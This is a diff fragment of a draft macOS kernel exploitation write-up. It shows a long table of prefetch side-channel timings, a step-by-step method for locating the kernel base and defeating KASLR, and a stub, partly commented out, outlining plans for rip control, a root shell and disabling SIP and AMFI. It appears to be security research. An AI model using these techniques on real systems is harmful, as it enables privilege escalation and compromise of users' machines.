+    0xffffff8011b00000    236     68     62     65     65     62    407    310    315    266     51     59     62     62     59     59
+    0xffffff8011c00000    499     62     62     65     62     62    109     65     65     62     62     62     62     62     62     62
+    0xffffff8011d00000    236     62     62     62     65     62     62     62     65     62     62     65     62     62     65     65
+    0xffffff8011e00000    466     62     65     59     62     62     62     65     62     62     62     62     62     62     62     62
+    0xffffff8011f00000    225     65     62     65     65     65     62     65     62     62     62     65     62     62     62     65
+    0xffffff8012000000    437    724     62     59     59     59     59     48     62     59     59     59     62     62     59     62
+    0xffffff8012100000    351     62     59     62     59     59     59     59     62     59     59     68     62     95    266     73
+    0xffffff8012200000    575    294     76     65     62     65     62     62     65     62     59     71     62     62     62     62
+    0xffffff8012300000    236     62     59     62     62     59     65     62     62     62     62     62     62    343    269     76
+    0xffffff8012400000    448     48     73     62     62     62     59     59     65     62     59     59     59     59     62     59
+    0xffffff8012500000    534    112    112    112    112    112    112    112     68     64     64     64     64     64     64     64
+    0xffffff8012600000    688    236    240    236    240    236    236    232    248    232    232    236    392    412    232     64
+    0xffffff8012700000    232    236    244    236    263    338    236    236    235    239    232    239    229    232    236    236
+    0xffffff8012800000    440    251    239     62    232    225    236    236    236    225    239    248    228    236    236    773
+    0xffffff8012900000    242    248    274    236    239    265   1704     62     62    242    236    233    242     62    440    225
+    0xffffff8012a00000    759    242    487    239    404    236   1255    266    236    239    236     73    236    222    357    236
+    0xffffff8012b00000    225    239    236    233    225     62    472    236    236    236    236    236    236    239    233    236
+    0xffffff8012c00000    440    236    723    316    239    225    242    236    228    236    236    437    260    443    239    239
+    0xffffff8012d00000    561    235    239    239    313    437    233    269     65    236    659     62    285    577    617    279
+    0xffffff8012e00000    279    450    450    719    446    446    641    446    402    279    961    322    416    405    608    531
+    0xffffff8012f00000    440    437    277    449    437    440    440    452    440    437    437    451    340    871   1128    526
+    0xffffff8013000000    272    457    454    941    487    478    467    454    443    443    446    484    490    454   1001    446
+    0xffffff8013100000    446    670    454    437    440    440    269    443  22964   1075    266    269    432   1175    280    446
+    0xffffff8013200000    809    886    440    443    709    443    463    443    280    449    443    457    443    446    446    443
+    0xffffff8013300000    443    517    381    446    283    496    425    345    302    269    440    440    446    475    454    443
+    0xffffff8013400000    446    272    446    443    454    443    440    443    446    443    443    487    180    657    452    285
+    0xffffff8013500000   1224    279    443    465    446    446    443    747    443    443    472    448    443    472    443    478
+    0xffffff8013600000    576    266    103    266    280    277    280    277    266    266    322    109    679    717    269    294
+    0xffffff8013700000    517    375    623    711    109     84    106    269    269    272    277    269    269    269    340    266
+    0xffffff8013800000    375     24     24    304    278    892     35     35     24     24     35     35     35     24     35     24
+    0xffffff8013900000    236     35     24     24     35     35     24     24     35     35     35     35     24     24     35     24
+    0xffffff8013a00000    298    272    283    269    269    307    266    280    283    269    290    272     95    280    290    266
+    0xffffff8013b00000    457    266    269    272    266    106    298    272    269    103    275    280    277    263    269    103
+    0xffffff8013c00000    434    304    294    433    266    103    109    266    280    280    437    266    283    266    274    269
+    0xffffff8013d00000    443    797    277     98    266    266    263    269    103    263    266    136    269    106    387     81
+    0xffffff8013e00000    269     49     35     35     24     35     24     24     24     35     24     35    106     32     21     32
+    0xffffff8013f00000    454     24     32     35     24     32     24     24     24     24     32     24    277    251    314     21
+    0xffffff8014000000    457     24     32     21     21     24     35     24     24     21     24     35     21     35     35     32
+    0xffffff8014100000    440     32     21     24     21     21    310     24    330    375    328     21     49     46     21     24
+    0xffffff8014200000    440     35     24     24     24     24     24     35     24     35     35     24     24     24     24     35
+    0xffffff8014300000    233     24     24     24     35     24     62     24    310    440     21     35     21     21     21     35
+    0xffffff8014400000    443     21     24     35    263    537    812    269    112    273     68    273     35    437    476    650
+    0xffffff8014500000    690     24    429     24     35     21    108     32     32     32     32     32     28     28     32     28
+    0xffffff8014600000   1686    512    443     31     28     21     62     99    279    381     31     31     31     32     32    277
+    0xffffff8014700000    236     24     35     24     35     24     35     35     24     35     35     31     31     31     31     31
+    0xffffff8014800000   1411     31     31    468    434    279     28     31     24     24     32     35     35     21     32     35
+    0xffffff8014900000    239     21     35     35     32     35     35     21     35     21     21     24     24     32     24     35
+    0xffffff8014a00000    463    296     24    614    440     24     24     24     35     35    582   1231    360     24     46     21
+    0xffffff8014b00000    236     21     35     35     32     21     21     32     24     21     21     21     24    142    363    277
+    0xffffff8014c00000    502     24     35     24     24     24     24     24     35     24     24     24     24     35     35     35
+    0xffffff8014d00000    233     35     24     24     24     24     35     35     24     35    649   1450    481    357     49     24
+    0xffffff8014e00000    451     49     35     35     21     24     35     24     21    437     35     24     35     35     35     24
+    0xffffff8014f00000    561     24     35     35     35     24     35    301    294     21     24     35     35     21     24     21
+    0xffffff8015000000    443     32     32     32     35     35     32     35     24     35     35     24     24     32     21     24
+    0xffffff8015100000    236     35     21     32    617    413    275    562     24     24     24     24     24     24     24     35
+    0xffffff8015200000    623     24     24     35     35     24     24     24     24     24     35     24     24     24     35     35
+    0xffffff8015300000    440    271    378   1869     21     21    446     35     35     24     24     24     35     24     24     35
+    0xffffff8015400000    440     35     35     35     24     24     35     24     35     35     35     35     24     35     24    623
+    0xffffff8015500000    756   1164    432     32     24     21     35     21     24     32     35     32     35     35     35     35
+    0xffffff8015600000    440     35     24    576     24     35     24     35     35     35    561    289    272     24     21     21
+    0xffffff8015700000    228     35     24     35     35     24     35     24     24     35     24     35     24     24     35     35
+    0xffffff8015800000    443     24     24     35     35     24     35     35    375    375     21     35     35     24     24     35
+    0xffffff8015900000    440     21     24     32     24     24     21     24     32     35     32     21     35     21     24     21
+    0xffffff8015a00000    451     32     24     35     24    342    611    275    440     24     49    443     31     31    453    276
+    0xffffff8015b00000    276    443    434    350     28     28    446     28     28     31     31    450    443    552   1615    453
+    0xffffff8015c00000    457     24     35     35     35     24     24     35     24     24     35     24     35     35     35     35
+    0xffffff8015d00000    239     35     24     35     35     24     24     24     35     24     35     24     24     24     24   1284
+    0xffffff8015e00000    446     35     32     24     32    266     24     24     32     21     21     24     24     24     21     35
+    0xffffff8015f00000    446     21     32     21     24     32     24     35     35     35    723    316    291     49     49     24
+    0xffffff8016000000    443     24     24     35     24     24     35     24     35     35     35    720    443     24     21     21
+    0xffffff8016100000    242     35     24     32     24     24     21     24    461     24     35     35    273     31     31     31
+    0xffffff8016200000    440     31     31     31     31     31     24     24     35     35     35     24     35     35     24     35
+    0xffffff8016300000    236     24    269     24     21     21     32    266     21     35     21     21     24     21     24     24
+    0xffffff8016400000    440     35     32     21     24     21     24     35     35     24     21     32     21     24     24     21
+    0xffffff8016500000    225     24     24     24     35     32     24     35     71    354     21     24    295     28     31     31
+    0xffffff8016600000    437     21     28     28     35     35     24     24     35     24     35     35     24     35    635    473
+    0xffffff8016700000    429     24     24     49     24     35     24     35     35     24     24     24     24     35     35     35
+    0xffffff8016800000    443     35     24    965     42     50     50     56     50     56     56     56     56     56     32     32
+    0xffffff8016900000    452     32     32     32     32     32     32     32     32     32     32     32     32     32     32     32
+    0xffffff8016a00000   1672    648    448     32     32     31     31     31     31     31     31     31     31     31     31     31
+    0xffffff8016b00000    235     31     31     31     31     35     21     21     32     35     24     21     35     21     35     21
+    0xffffff8016c00000    440     21     21     32     35     35     24     32     35     32     24     21     21     21     32     35
+    0xffffff8016d00000    236     32     24     35     24     21     32     24     35     21     21     35     24     35     21     24
+    0xffffff8016e00000    638     56     56     56     56     56     50     56     42     50     32     32     32     32     32     32
+    0xffffff8016f00000    240     32     32     32     32     32     32     32     32     32     32     32     32     32     32     32
+    0xffffff8017000000    464     32     32     32     32     31     31     31     31     31     28     31     31     28     31     28
+    0xffffff8017100000    229     28     31     31     28     31     24     35     24     24     24     35     35     24     35     24
+    0xffffff8017200000    437     35     35     24     24     35     24     24     35     24     24     24     35     24     24     38
+    0xffffff8017300000   1057     35     24     35     35    437    443    443     49     21    468     31     31     31    440     31
+    0xffffff8017400000    524    443     28     28     28     35     35     35     35     24     35     24     35     35     35     35
+    0xffffff8017500000    419     35     35    576    443    454     24     21     24     21     21     24     35     21     21     21
+    0xffffff8017600000    440     21     35     32     35    443     24     21     35     21     35     21     21     32     21     21
+    0xffffff8017700000    322     32     35     32     32     32     24     21    272     24     24     24     24     24     24     24
+    0xffffff8017800000    440     24     24     35     35     24     35     35     35     35     35     35     35     24     24     24
+    0xffffff8017900000    239     24     35     35     24     24     35     24     24     35     35     35     35     35     35     35
+    0xffffff8017a00000    803     24     35     24     35     35     35     24     35     24     24     24     35     35     24     24
+    0xffffff8017b00000    446     35     24     24     24     35     24     24     35     35     35     24     24     35     35     24
+    0xffffff8017c00000    738     24     24     35     35     35     24     35     35     35     24     24     35    567   1272    590
+    0xffffff8017d00000    211     24     21     21     35     35     35     24     24     35     24     24     24     35     24     35
+    0xffffff8017e00000    585    452    451     21     24     21     32    541   2075    441    484     24     24     35     35     35
+    0xffffff8017f00000    233     35     24    646     35     35     35     35     24     24     62     35     24     24     24     35
+    0xffffff8018000000    449     24     35     35     24     35     35     35     24     24     35    735     56     56     56     50
+    0xffffff8018100000    334     42    452     32     32     32     32     28     32     28     32     28     32     32     28     21
+    0xffffff8018200000    437     28     31     28     31     31     31     31     28     28     31     31   1426    573     24     24
+    0xffffff8018300000    236     24     35     35     35     35     24     24     24     24     24     35     35     24     35     24
+    0xffffff8018400000    443     35     35     35     35     35     35     24     35     35     24     35     35     35     24     24
+    0xffffff8018500000    225     35     24     24     24     24     24     24     24    357    381    564    457     24     24     24
+    0xffffff8018600000    505     35     24     24     35     24     24     24     35     35     24     35     24     35     35     35
+    0xffffff8018700000    236     24     24     24     35     24     35     35     35     24     24     24     24     35     24     24
+    0xffffff8018800000    443     35     24     24     35     35     24     35     35     35     35     35     24     24     24     35
+    0xffffff8018900000    225     35     24     35     35     35     35     35     24     35    274     35     24     35     35     24
+    0xffffff8018a00000    440     35     24     24     35     35     35    448     32     24     35     24     24     21     24     24
+    0xffffff8018b00000    236     35     21     24     21     21     24     21     32     24     21     32     35    517    541     24
+    0xffffff8018c00000    443     28     31     28    273     31     31     31    276     31    273     31    276    270     28    270
+    0xffffff8018d00000    239     28     31     31   1187    269     35     35     24     35     35     35     24     35     24     24
+    0xffffff8018e00000    440     24     24     35     35     24     35     35     24     24     35     35     35     24     35     35
+    0xffffff8018f00000    328     24     35     24     24     24     35     35     35     24     35     24     24     24     35     24
+    0xffffff8019000000    443     24     24     24     35     35     35     24     24     24     35     24     35     24     24     35
+    0xffffff8019100000    233     24     35     35     24     24     24     35     35     24     24     35     35     24     24     24
+    0xffffff8019200000   1222   1308    269     24     21     21     21     21     21     35     24     24     24     32     32     35
+    0xffffff8019300000    236     35     21     21     21     32     35     21     21     24     24     35     24     24     24     35
+    0xffffff8019400000    440     21     24     21     35     24     35     21    440     32     21     21     35     35     21     32
+    0xffffff8019500000    251     21     32     32     21     24     35     21     32     32     21     35     35     21     21     32
+    0xffffff8019600000    440     24     21     24     32     32     32     35     21     32     21     24     21    452    463     24
+    0xffffff8019700000    239     21     24     32     32     21     24     24     32     32     35     24     21     35     32     35
+    0xffffff8019800000    443     32     35     21     32     24     32     24     32     32     21     21     35     35     35     24
+    0xffffff8019900000    225     35     35     21     21     32     21     21     32     32     35     32    514    443     24     24
+    0xffffff8019a00000    457     49     35     35     35     24     35     24    452     35     35     24    930     24     24     35
+    0xffffff8019b00000    443     35     24     35     24     35     35     35     35     24     35     35     24     24     35     24
+    0xffffff8019c00000    451     35     35     35     24     24     35     24     35     35     24     35     35     35     35     24
+    0xffffff8019d00000    222     24     24     24     24     35     35     24     35     24     24     35     24     35     35     24
+    0xffffff8019e00000    470     24     35     35     24     24     35     24     24     24     24     24     35     24     35     24
+    0xffffff8019f00000    233   1308     35     32     32     21     21     21     32     35     21     35     32     21     32     32
+    0xffffff801a000000    582     21     21     24     35     21     35     32     24     24     35     24     35     24     35     24
+    0xffffff801a100000    945     32     35     21     32     35     24     24     35     24     24    443     32     35     24     21
+    0xffffff801a200000    443     21     24     35     24     35     24     35     35     24     35     35     21     32     32     21
+    0xffffff801a300000    233     32     35     35     24     21     35     32     35     35     35     21     32     32     24     24
+    0xffffff801a400000    443     21     32     21     24     24     21     21     24     32     21     24     35     32     24     21
+    0xffffff801a500000    233     35     35     21     21     35     24     35     32     32     35     21     21     32     32    440
+    0xffffff801a600000    768     35     35     35     21     35     35     32     24     24    464     35     24     35    478    638
+    0xffffff801a700000    824     35     35    527     28     28    443     31     31    453     24    451     24    453     28     28
+    0xffffff801a800000   1097     31     31     31     24     35     21     24     21     21     21     35     35     35     21     35
+    0xffffff801a900000    711    454     24     24     21     21     35     35     35     35     21     21     21     35     21     32
+    0xffffff801aa00000    552     24     24     24     35     35     35     32     21     35     32     21     32     32     24     35
+    0xffffff801ab00000    236     21     21     21     35     32     32     35     21     24    526     35     24     35     21    443
+    0xffffff801ac00000    440     31     31     31     31     31     31     31     31     31     31     31     31     24     35     24
+    0xffffff801ad00000    236     24     35     35     24     35     24     35     24     35     24     24     24     35     35     24
+    0xffffff801ae00000    590     35     35     24     24     24     35     35     24     24     35     24     24     24     24     24
+    0xffffff801af00000    222     24     35     24     24     24     24     24     35     24     24     35     24     24     35     35
+    0xffffff801b000000    448     35     24     35    466    440     35     21     35     32     32    452    534    460     46     24
+    0xffffff801b100000    248     35     35     24     24     35     35     35     35     24     24     24     24     24     35     35
+    0xffffff801b200000    457     35     24     24     24     24     35     35     24     35     35    440     32     24     32     21
+    0xffffff801b300000    225     24     21     24     24     35     24     21     32     35     21     21     24     35     35     32
+    0xffffff801b400000    582     24     32     32     32     21     35     21     32     35     21    809   1512     21     24     24
+    0xffffff801b500000    245     35     35     24     35     24     35     35     35     24     35     24     35     35     24     24
+    0xffffff801b600000    532     35     35     24     24     24     24     35     24     35     24     24     24     24     24     35
+    0xffffff801b700000    239     24     24     35     24     35     24     24     35     24     24     24     24     24     24     24
+    0xffffff801b800000    446     35     24     35     24     24    481   1665    440     49     49     24     24     24     24     35
+    0xffffff801b900000    454     35     24     24     24     24     24     24     35     24     24     35     35     35     35     35
+    0xffffff801ba00000    555     24     24     24     24     35     35     24     35     24     21     21     21     24    454     24
+    0xffffff801bb00000    440     24     24     24     24     35     35     24     35     24     24     35     24     24     35     24
+    0xffffff801bc00000    576     24    653     24     24     35     35     35     24     24     35     24     35     24     35     35
+    0xffffff801bd00000    475    694    438    472     24     24     21     35     21     35     32     21    493    443     35     35
+    0xffffff801be00000   1048     24     24     35     24     24     24     35     24     24     24     24     24     24     35     35
+    0xffffff801bf00000    225     35    451     24     24     24     24     24     21     21     35    898    277     21    443     24
+    0xffffff801c000000    632    279     31     31     31     31    450    456     31    450     31    450     31     31     28    450
+    0xffffff801c100000    242    443     31     28     28     31     31    573    446    437     31    443     31     31     31     31
+    0xffffff801c200000    450     31     31     31     31     31     31     24     21     32     35     32     24     32     21     32
+    0xffffff801c300000    236     35     35     24     21     35     21     24     24     32     24     21     21     24     21     32
+    0xffffff801c400000    499     32     32     21     24     24     35     24     32     21     21     24     21     21     35     32
+    0xffffff801c500000    239     24     32     24     21     24     35     24     24     24     24     24     21     21     35     21
+    0xffffff801c600000    452     35     21     32     24     21     24     21     21     21     35     32     24     21     35     24
+    0xffffff801c700000    236    543    277     24     24     24     24     24     35     24     24     35     35     24     35     24
+    0xffffff801c800000    443     35     24     24     24     24     24     35     24     24     35     24     24     24     24     24
+    0xffffff801c900000    236    475    458     24    457     21     35     35     35     24     35     35     24     35     35     35
+    0xffffff801ca00000    437     35     35     24     35     24     35     24     35     35     35     24     35     35     35     24
+    0xffffff801cb00000    225     24     35     24     35     35     24     24     35     24     24     35     35     35     35     35
+    0xffffff801cc00000    443     35     35     24     24     35     24     24     24     35     24     35     24     24     35     24
+    0xffffff801cd00000    239     35     35     24     24     35     24     35     24     35     24     35     24     35     35     35
+    0xffffff801ce00000    986     24     24     35     35     24     24     35     35     24     24     35    543    526     21     21
+    0xffffff801cf00000    245     21     35     35     32     35    272     24     35     24     35     24     35     24     24     24
+    0xffffff801d000000    443     24     24     24     24     24     35     24     24     35     24     35     24     24     24     24
+    0xffffff801d100000    257    437     24     21     35     35     32    555    449     24     35     24     35     35     35     35
+    0xffffff801d200000   1869     24     24     24     35     24     35     35     21     21     24     21     35     35     32     35
+    0xffffff801d300000    239     24     32     35     35     21     21     21     32     32     24     21     32     21     24     35
+    0xffffff801d400000    511     32     41     24     35     35     35     35     35     35     24     24     35     24     35     24
+    0xffffff801d500000    446     24     24     35     35     24     35     24     24     24     24     24     35     35     35     35
+    0xffffff801d600000    443     35   1175    440     24     21     49     35    277     35     24     35     35     32     21     35
+    0xffffff801d700000    508     32     21     32     32     35     24     35     35     35     21     21     35     21     21     24
+    0xffffff801d800000    443     24     35     35     21     24     35     21     24     35     24     24     35     35     21     21
+    0xffffff801d900000    236     21    469     56    567    800    279     31     31     24    597    452    475     35     24     49
+    0xffffff801da00000   1539     35     24     24     24     24     35     35     35     24     24     24     35     24     24     24
+    0xffffff801db00000    446     35     24     24     35     24     35     35     35     35    269     35     35     21     24     24
+    0xffffff801dc00000    537     35     21     35     32     24     21     35     21     35     21     24     24     32     32     21
+    0xffffff801dd00000    222     24     32     21    705    298     35     35     35     24     24     24     35     35     24     24
+    0xffffff801de00000    679     38     35     35     24     35     24     24     35     35     24     24     24     24     24     35
+    0xffffff801df00000    228     35     35     24     35     35     24     24     35     35     24     35     24     24     35     35
+    0xffffff801e000000    443     24     24     35     24     24     35     35     35     35     24     24     24     24     35     24
+    0xffffff801e100000    443     24     24     35     24     24     24     35     24     35     35     35     35     35     35     24
+    0xffffff801e200000    443     35   1506     35     35     35     35     35     35     24     35     24     24     24     24     35
+    0xffffff801e300000    225     35     35     24     24     24     24     24     24     24     35     24     24     24     35     35
+    0xffffff801e400000    454     24     35     24     35     24     24     35     35     24     35     24     35     35     35     35
+    0xffffff801e500000    239     24     24     35     24     35    694    449     35     21     24     24     24     35     24     24
+    0xffffff801e600000    437     35     24     24     24     35     24     35    440     24     32    440     24     35     24     24
+    0xffffff801e700000   1140     24     35     24     24     24     35     24     24     35    437     35     24     32     32     21
+    0xffffff801e800000    443     35     24     35     35     21     24     21     32     21     21     24     21     24     21     32
+    0xffffff801e900000    236     24     32     21     32     35     21     24     32     24     24     21     24     32     24     24
+    0xffffff801ea00000    443     32     35     35     21     21     35     21     35     21     21     32     35     21     32     21
+    0xffffff801eb00000    225     32     21     35     21     35     24     24     32     24     24     32     35     24     24     21
+    0xffffff801ec00000    437     21     21     35     35     24     35     24     24     35     24     24     21     21     32     32
+    0xffffff801ed00000    222     32    579   1308     32     35     35     32     35     24     24     35     32     21     21     32
+    0xffffff801ee00000    514     32     32     35     32     24     21     32     32     32     32     35     21     32     21     21
+    0xffffff801ef00000    310     21    791    957     49    447     49    437     24     24     21     21     24     32     21     21
+    0xffffff801f000000    821     21     21     21     32     35     24     35     35     35     35     32     24     32     24     24
+    0xffffff801f100000    236     21     35     35     32     35     21     32     21     21     24     21     21     32     21     24
+    0xffffff801f200000    440    236     32     32     32     21     32     24     21     35     24     21     24     32     21     32
+    0xffffff801f300000    233    331     24     21     24     21     21     32     32     21     35     35     21    989    446     35
+    0xffffff801f400000   1500     24     24     35     35     27    505     35     35     24     24     35     24     35     35     24
+    0xffffff801f500000    242     24     24     35     24     35     35     35     24     24     35     35     24     24     35     35
+    0xffffff801f600000    514     35     24     35     35    437     35     24     24     35     24     35     35     35     24     35
+    0xffffff801f700000    236     24     35     24     24     24     24     35     35     35     35     35     35     24     35     24
+    0xffffff801f800000   1078     35     24     35     35     24     35     35     24     24     35     24     24     35     24     35
+    0xffffff801f900000    233     35     35     24     35     24     35     24     24     35     24     24     35     24     24     35
+    0xffffff801fa00000    711     24     35     24     35     24     35     35     24     24     35     24     24     35     35     35
+    0xffffff801fb00000    239     35     35     35     24     35     35     35     35    578    452     35     24     35     35     24
+    0xffffff801fc00000    534     24    741    685   1189     49     24     24     24     24     24     35     24     24     24     24
+    0xffffff801fd00000    617     35     35     24     35     24     35     24     35     35     24     35     24     35     35    443
+    0xffffff801fe00000    286     35     35     35     24     24     24     24     24     24     24     35     35     35     35     35
+    0xffffff801ff00000    236     24     24     24     35     24     24     35     24     35     24     35     24     35     24     35
+
+Here the kernel base is `0xffffff800f200000`, and the difference of timings before and after is very visible. Formalising what indicates the location of the kernel base and what doesn't is not trivial though, mostly due to outliers. By dull trial-and-error I have found the following to be highly reliable, at least on my machines:
+
+1. Sort the 16 timings for each address from shortest to longest.
+2. Discard all but the middle 4 values, and calculate the average of those.
+3. If that value is below 50, treat the address as mapped, otherwise treat it as unmapped.
+4. Find the first block of mapped addresses large enough to contain the kernel's `__TEXT` segment.
+
+_This is implemented in [`src/hid/kaslr.c`](TODO)._
+
+Despite the authors of the paper stating that their attack works also in virtualised environments, I observed timings for mapped and unmapped pages to be indistinguishable on a Sierra installation running inside VirtualBox. But whatever, I've already shown that my bug can leak the kernel slide too if need be. :P
+
+### Getting `rip` control
+
+Back to corrupting stuff on the heap with `evg`! Since we want stuff from here on out to work with both ways of leaking the kernel slide, we're gonna have to to assume that we're back to not knowing the kernel address of our shared memory and not being able to read kernel memory - the only thing we learned is the kernel slide. 
+
+
+
+<!-- We've already seen most of the techniques, so it's time to do some actual damage! Let's get root, bring the kernel task port to userland, install a root shell, and disable SIP and AMFI for good! :D -->
+
+
 
 ## Conclusion
 
@@ -712,6 +1284,7 @@ In the beginning, the problem with pointer arrays was that they would only ever 
 - Luca Todesco: [Yalu102 jailbreak][yalu102] (code)
 - Jonathan Levin: [Phœnix jailbreak][phoenix] (write-up)
 - tihmstar and myself: [PhœnixNonce][phnonce] (code)
+- Daniel Gruss, Clémentine Maurice, Anders Fogh, Moritz Lipp and Stefan Mangard: [Prefetch Side-Channel Attacks][prefetch] (paper)
 
 <!-- TODO: tpwn? -->
 
@@ -724,3 +1297,4 @@ In the beginning, the problem with pointer arrays was that they would only ever 
   [phnonce]: https://github.com/Siguza/PhoenixNonce
   [qwerty]: https://twitter.com/qwertyoruiopz
   [tihm]: https://twitter.com/tihmstar
+  [prefetch]: https://gruss.cc/files/prefetch.pdf
